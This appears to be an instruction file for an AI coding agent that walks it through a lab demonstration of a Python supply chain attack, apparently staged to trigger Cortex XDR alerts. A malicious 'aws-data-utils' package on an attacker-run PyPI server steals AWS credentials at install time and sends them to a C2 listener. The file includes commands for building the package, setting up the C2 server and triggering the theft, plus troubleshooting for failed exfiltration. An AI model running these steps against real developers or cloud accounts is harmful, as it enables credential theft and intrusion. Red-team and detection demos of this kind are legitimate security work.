# Warp Agent Instructions - Supply Chain Attack Demo

This project demonstrates a supply chain attack: malicious package → credential theft → cloud enumeration.

## Agent Execution Context

When a user asks you to help with this demo, follow the step-by-step execution based on which machine they're on:

### Machine Detection
First, identify which lab machine the user is on:
- **C2 Server** (Fake WAN) - Attacker infrastructure
- **Victim Endpoint** - Developer machine with Cortex XDR
- **Build Machine** - For packaging the project

### Execution Flows

#### On Build Machine (packaging for lab transfer)
```bash
cd /Users/mabutbul/python-pack
tar -czf python-pack-demo.tar.gz \
  README.md EXECUTION_GUIDE.md QUICK_START_CHECKLIST.md WARP.md \
  1-attacker-infrastructure/ 2-malicious-package/ \
  3-victim-application/ 4-attacker-operations/ 5-aws-infrastructure/
```

#### On C2 Server (Linux)

**RECOMMENDED: Quick Demo (Automated Setup with tmux):**
```bash
cd ~ && tar -xzf python-pack-demo.tar.gz
cd python-pack/1-attacker-infrastructure
./quick_demo.sh <C2_IP>
```
**What it does:**
- Builds malicious package with embedded C2 IP
- Starts PyPI server (port 8080) in tmux session 'pypi'
- Starts C2 listener (port 4444) in tmux session 'c2'
- View logs: `tmux attach -t pypi` or `tmux attach -t c2`
- Detach with: Ctrl+B then D

**ALTERNATIVE: Manual Setup (Two Terminals):**

**Terminal 1 - Build and Start PyPI Server:**
```bash
cd ~/python-pack/2-malicious-package
./build_and_upload.sh <C2_IP>
cd ../1-attacker-infrastructure
./start_pypi_only.sh <C2_IP>
```

**Terminal 2 - Start C2 Listener:**
```bash
cd ~/python-pack/1-attacker-infrastructure
./start_c2_only.sh <C2_IP>
```

**Step 3 - Setup AWS (new terminal, if needed):**
```bash
cd ~/python-pack/5-aws-infrastructure
./setup_aws.sh
```

**Step 4 - Execute Cloud Attack (after victim installs package):**
```bash
cd ~/python-pack/4-attacker-operations
./run_attack.sh
```

#### On Victim Endpoint (Linux)
**Step 1 - Extract and Setup:**
```bash
cd ~ && tar -xzf python-pack-demo.tar.gz
cd python-pack
mkdir -p ~/.aws
cp 5-aws-infrastructure/demo_aws_credentials ~/.aws/credentials
```

**Step 2 - Configure to use attacker PyPI:**
```bash
cd 3-victim-application
./setup_victim.sh <C2_IP>
```

**Step 3 - Trigger Attack:**
```bash
cd ~/python-pack/3-victim-application
export PIP_CONFIG_FILE=$(pwd)/.pip/pip.conf
pip install -r requirements.txt
```

**Step 4 - Optional Runtime Test:**
```bash
python3 app.py
```

#### On Victim Endpoint (Windows)
**Step 1 - Setup AWS Credentials:**
```powershell
cd C:\path\to\python-pack\3-victim-application
.\setup_aws_creds.ps1
```

**Step 2 - Configure Victim:**
```powershell
.\setup_victim.ps1 <C2_IP>
```

**Step 3 - Trigger Attack:**
```powershell
.\trigger_attack.ps1 <C2_IP>
```
**Note:** Script automatically clears pip cache and forces source distribution install.

**Alternative: Manual Command (For Troubleshooting):**
```powershell
pip cache purge
pip uninstall aws-data-utils -y
$env:PIP_CONFIG_FILE = "$(pwd)\.pip\pip.conf"
pip install --no-build-isolation --no-binary aws-data-utils aws-data-utils
```

**Step 4 - Verify Success:**
- Check C2 terminal for "Credentials stolen!" message
- Check Cortex XDR console for alerts

### Key Variables to Ask User
- **C2_IP**: The IP address of the C2 server (attacker infrastructure)
- **Current Machine**: Which lab machine are they on?

### Important Notes for Agent
1. **Always ask** for the C2 IP before running build or victim setup scripts
2. **Check** if C2 server is already running before starting it
3. **Verify** AWS credentials file exists before victim setup
4. **Monitor** XDR alerts at each phase when on victim machine
5. **Keep C2 server running** - it needs to stay open to receive credentials
6. **C2 Server Architecture** - Runs PyPI server (port 8080) in background and C2 listener (port 4444) in foreground as separate processes
7. **Windows Victims** - Use PowerShell scripts (.ps1) which support both direct pip install and manual download methods

### Success Indicators to Verify
- C2 server shows "Credentials stolen" message
- AWS enumeration script completes without errors
- User can see Cortex XDR alerts in their console

### Troubleshooting

#### Issue 1: Credentials Not Exfiltrated
**Symptoms:** C2 shows connection but no "Credentials stolen!" message

**Possible Causes:**
1. **Pip installed wheel instead of source distribution**
   - Modern pip (25.0+) prefers wheels which don't execute setup.py
   - **Solution:** Use `--no-build-isolation --no-binary aws-data-utils` flags
   
2. **C2 IP not embedded in package**
   - Build script issue or tarball contains placeholder
   - **Solution:** Verify tarball:
   ```bash
   cd ~/python-pack/1-attacker-infrastructure/packages/simple/aws-data-utils
   tar -xzf aws_data_utils-*.tar.gz
   grep "C2_SERVER_IP" aws_data_utils-*/setup.py
   # Should show: C2_SERVER_IP = "<your_ip>" not "REPLACE_WITH_C2_IP"
   ```

3. **AWS credentials don't exist on victim**
   - Victim hasn't run setup_aws_creds.ps1
   - **Solution:** Run `Test-Path C:\Users\<user>\.aws\credentials` on victim

#### Issue 2: "Using cached aws_data_utils wheel"
**Symptoms:** Pip install shows "Using cached" and wheel filename

**Solution:**
```powershell
pip cache purge
pip uninstall aws-data-utils -y
# Then reinstall
```

#### Issue 3: "Could not find a version that satisfies requirement"
**Symptoms:** Pip can't find package when using `--index-url`

**Causes:**
- PyPI server not running
- Source distribution (.tar.gz) missing from server
- Using `--index-url` blocks access to real PyPI for dependencies

**Solution:**
- Use `--extra-index-url` instead (in pip.conf - already configured)
- Verify package exists: `curl http://<C2_IP>:8080/simple/aws-data-utils/`

#### Issue 4: C2 Parser Error "list index out of range"
**Symptoms:** C2 receives data but fails to parse

**Solution:** Use updated c2_listener_only.py with robust parsing (fixed in latest version)

#### Issue 5: Line Ending Issues on Linux C2
**Symptoms:** `bad interpreter: /bin/bash^M` or syntax errors

**Root Cause:** Windows CRLF line endings incompatible with Linux

**Prevention (RECOMMENDED):** Run `fix_line_endings.ps1` on Windows BEFORE transferring files

**Fix on Linux (if you forgot):**
```bash
cd ~/python-pack
find . -name "*.sh" -type f -exec sed -i 's/\r$//' {} \;
```

### Diagnostic Commands
```bash
# C2 Server Checks
ps aux | grep -E '(http.server|c2_listener)'
curl http://<C2_IP>:8080/simple/aws-data-utils/
ls -la ~/python-pack/1-attacker-infrastructure/stolen_*
netstat -tuln | grep -E '(8080|4444)'

# Network Connectivity
ping <C2_IP>
nc -zv <C2_IP> 4444
nc -zv <C2_IP> 8080

# Victim Checks (Windows)
Test-Path C:\Users\<user>\.aws\credentials
pip list | Select-String "aws-data-utils"
pip cache list
Get-Content .pip\pip.conf
```

### Quick Cleanup Commands
```bash
# Victim cleanup
pip uninstall aws-data-utils -y
rm -rf ~/python-pack

# C2 cleanup
pkill -f c2_server.py
cd ~/python-pack/1-attacker-infrastructure && rm -f stolen_*
```

## Agent Behavior Guidelines
- Ask which machine the user is on before starting
- Request the C2 IP address if it's needed for the current step
- Explain what each script does before running it
- Provide real-time status updates during execution
- Alert user to check Cortex XDR console at key moments
- Use the detailed EXECUTION_GUIDE.md if user needs more context
